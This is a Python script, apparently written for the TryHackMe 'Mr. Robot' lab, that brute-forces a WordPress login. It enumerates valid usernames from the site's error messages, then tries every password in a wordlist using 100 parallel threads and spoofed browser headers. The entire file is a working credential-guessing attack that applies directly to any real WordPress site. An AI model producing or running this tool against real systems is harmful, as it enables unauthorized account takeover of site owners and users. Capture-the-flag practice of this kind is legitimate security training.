from concurrent.futures import ThreadPoolExecutor, wait
from time import sleep
import requests
import argparse

parser = argparse.ArgumentParser(
                    prog = 'Mr.Robot WP Brute',
                    description = 'A small tool to bruteforce the username and password for Mr. Robot box on TryHackMe',
                    epilog = '----------------------------------------')
parser.add_argument('-u', '--url', help='URL for the wp-login page (eg. http://10.10.146.232/wp-login.php)', required=True)
parser.add_argument('-w', '--wordlist', help='Wordlist path', required=True) 

args = parser.parse_args()

# url = f"http://10.10.146.232/wp-login.php"
url = args.url
splits = url.split('/')
host = splits[0] + '//' + splits[2]
# filename = f"/home/sarthak/fsocity.dic"
filename = args.wordlist

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # Requests sorts cookies= alphabetically
    # 'Cookie': 's_cc=true; s_fid=3A8E1B7160CC2CE1-2C2AD7243C160853; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check; s_nr=1667582929890',
    'Origin': f'{host}',
    'Referer': f'{url}',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
}

get_res = requests.get(f"{url}")

def read_file(file_name):
    for row in open(file_name, "r"):
        yield row

class Stopper(object):

    def __init__(self):
        self.stop = False
        self.user = ""
        self.password = ""


class Worker(object):

    def __init__(self, stopper):
        self.stopper = stopper

    # This method is called when the worker is executed.
    def __call__(self, line, mode):

        # Don't do anything if stop condition was found by another worker.
        if self.stopper.stop:
            print("Skip already generated job %d" % line)
            return

        if mode:
            data = {
                'log': f'{mode}',
                'pwd': f'{line}',
                'wp-submit': 'Log In',
                'redirect_to': f'{host}/wp-admin/',
                'testcookie': '1',
            }

            res = requests.post(url, headers=headers,data=data, cookies=get_res.cookies)
            # print(res.text)
            # print(line)
            if(res.text.count("The password you entered for the username") == 0):
                self.stopper.stop = True
                self.stopper.password = line
            return

        # Simulate some work
        data = {
            'log': f'{line}',
            'pwd': 'admin',
            'wp-submit': 'Log In',
            'redirect_to': f'{host}/wp-admin/',
            'testcookie': '1',
        }

        res = requests.post(url, headers=headers,data=data, cookies=get_res.cookies)
        # print(res.text)
        # print(line)
        if(res.text.count("Invalid username") == 0):
            self.stopper.stop = True
            self.stopper.user = line


def main():
    with ThreadPoolExecutor() as executor:

        # Use this object to communicate
        stopper = Stopper()

        # create threads
        maxThreads = 100
        lines = read_file(filename)
        while not stopper.stop:
            jobs = []
            for i in range(maxThreads):
                jobs.append(executor.submit(Worker(stopper), next(lines, "admin"), None))
            wait(jobs)  # Limit the number of simultaneously created workers.

        if stopper.user == "":
            print(f"[-] Username not found!")
            exit()
        
        print(f"[+] Username found : {stopper.user}")
        stopper.stop = False
        lines = read_file(filename)
        while not stopper.stop:
            jobs = []
            for i in range(maxThreads):
                jobs.append(executor.submit(Worker(stopper), next(lines, "admin"), stopper.user))
            wait(jobs)  # Limit the number of simultaneously created workers.


        print(f"[+] Password found : {stopper.password}")



if __name__ == "__main__":
    main()